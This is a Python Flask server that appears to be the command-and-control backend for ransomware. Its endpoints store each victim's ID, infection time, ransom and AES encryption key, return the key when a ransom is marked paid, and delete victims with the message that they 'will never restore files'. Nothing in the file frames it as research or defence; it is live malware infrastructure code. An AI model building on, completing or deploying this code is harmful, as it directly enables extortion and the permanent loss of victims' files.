import uuid

from flask import Flask, jsonify, request
from flask_cors import CORS
from db import victims
import time

V = victims()

# configuration
DEBUG = True

# instantiate the app
app = Flask(__name__)
app.config.from_object(__name__)

# enable CORS
CORS(app, resources={r'/*': {'origins': '*'}})

# def remove_victim(victim_id):
#     for victim in V.vicList:
#         if victim['id'] == victim_id:
#             V.vicList.remove(victim)
#             return True
#     return False


# sanity check route
# @app.route('/ping', methods=['GET'])
# def ping_pong():
#     return jsonify('pong!')


@app.route('/victims', methods=['GET'])
def all_victims():
    response_object = {'status': 'success'}
    response_object['victims'] = V.vicList
    return jsonify(response_object)

@app.route('/victims/add', methods=['POST'])
def add_victim():
    # if request.is_json:
    #     return '400 Not Json'
    post_data = request.get_json()
    response_object = {'status': 'success'}
    V.vicList.append({
            # 'id': uuid.uuid4().hex,
            'id': post_data.get('id'),
            'inf_time': time.ctime(),
            'ransom': post_data.get('ransom'),
            'AES_key': post_data.get('AES_key')
        })
    V.new_victim(vid=post_data.get('id'), pkey=post_data.get('AES_key'))
    response_object['message'] = 'Victim added!'
    return jsonify(response_object)


@app.route('/victims/<victim_id>', methods=['POST', 'DELETE'])
def update_victim(victim_id):
    # if request.is_json:
    #     return '400 Not Json'
    post_data = request.get_json()
    response_object = {'status': 'success'}
    if request.method == 'DELETE':
        if V.rm_victim(victim_id):
            response_object['message'] = 'This victim will never restore files'
        else:
            response_object['message'] = 'No such victim'
    else:

        if post_data.get('ransom'):
            k = V.paid(victim_id)
            response_object['message'] = 'Promise is debt! Your files are intact.'+k
            response_object['AES_key'] = k
    # else:
    #     response_object['message'] = 'Do not play tricks!'
    return jsonify(response_object)


# @app.route('/victims/<victim_id>', methods=['PUT', 'DELETE'])
# def single_victim(victim_id):
#     response_object = {'status': 'success'}
#     if request.method == 'PUT':
#         post_data = request.get_json()
#         response_object['post_data'] = post_data
#         remove_victim(victim_id)
#         VICTIMS.append({
#             # 'id': uuid.uuid4().hex,
#             'id': post_data.get('victim_id'),
#             'AES_key': post_data.get('AES_key'),
#             'paid': post_data.get('paid')
#         })
#         response_object['message'] = 'Victim updated!'
#     if request.method == 'DELETE':
#         response_object['id'] = victim_id
#         if remove_victim(victim_id):
#             response_object['message'] = 'Victim removed!'
#         else:
#             response_object['status'] = 'False'
#             response_object['message'] = 'Victim failed!'
#     return jsonify(response_object)


if __name__ == '__main__':
    app.run()